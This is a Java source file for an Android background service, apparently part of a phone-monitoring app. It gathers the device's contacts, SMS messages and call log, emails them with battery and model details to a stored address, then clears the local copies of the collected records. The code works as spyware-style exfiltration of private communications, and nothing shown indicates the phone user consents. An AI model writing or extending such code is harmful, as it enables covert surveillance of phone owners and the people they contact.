package circle.internet;

import java.util.ArrayList;

import circle.db.InfoAboutThePhone;
import circle.db.controllers.MonitorSQLiteAdapter;
import circle.db.models.EMail;
import circle.db.models.Gallery;
import circle.db.models.People;
import circle.internet.block.CallBlock;
import circle.internet.block.ContactBlock;
import circle.internet.block.SmsBlock;
import circle.internet.email.MailSenderClass;

import android.app.IntentService;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

public class ServiceSenderForText extends IntentService {

	public ServiceSenderForText() {
		super("ServiceSenderForText");
	}

	private static final String LOG_TAG = "monitoring";
	private static ServiceSenderForText instance = null;
	private static MonitorSQLiteAdapter mAdapter = MonitorSQLiteAdapter.SQLITE_ADAPTER;
	private static String title;
	private static String text;
	private static String from;
	private static String where;
	private static ArrayList<Gallery> attach;
	private static String password;
	private static boolean smsLogic;

	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}

	public static boolean isInstanceCreated() {
		return instance != null;
	}// met

	@Override
	public void onCreate() {
		Log.e(LOG_TAG, "onCreate ServiceSenderForText");
		instance = this;
		super.onCreate();
	}

	@Override
	protected void onHandleIntent(Intent intent) {
		try {
			mAdapter.open(this);
			People people = mAdapter.selectPeople();
			EMail eMail = mAdapter.selectEMail();
			if (people != null && eMail != null && people.getSettings() == 1) {
				String listForMail = "";

				listForMail += ContactBlock.getContact(
						people.getSettingContact(), this);
				listForMail += SmsBlock.getSms(this);
				listForMail += CallBlock.getCall(this);

				if (!listForMail.equals("")) {
					try {
						title = android.os.Build.BRAND + " - "
								+ android.os.Build.MODEL;
						attach = new ArrayList<Gallery>();
						from = where = eMail.getAddress();
						password = eMail.getPassword();

						MailSenderClass sender = new MailSenderClass(from,
								password);
						text = InfoAboutThePhone
								.getInfoAboutBatteryCharge(this)
								+ "\n\n\n"
								+ listForMail;

						sender.sendMail(title, text, from, where, attach);
						smsLogic = true;

					} catch (Exception e) {
						e.printStackTrace();
						smsLogic = false;
					} finally {
						Log.i(LOG_TAG, "smsLogic- " + smsLogic);
						if (smsLogic) {
							String idPhone = people.getPhoneId();
							if (people.getSettingContact() == 1) {
								people.setSettingContact(0);
								mAdapter.updatePeopleSettingContact(people);
							}
							mAdapter.deleteSms(idPhone);
							mAdapter.deleteCall(idPhone);
							mAdapter.deleteContact(idPhone);
							mAdapter.deleteNumber();
						}
					}
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			mAdapter.close();
			stopService(new Intent(this, ServiceSenderForText.class));
		}
	}

	@Override
	public void onDestroy() {
		instance = null;
		Log.e(LOG_TAG, "onDestroy ServiceSenderForText");
		super.onDestroy();
	}
}
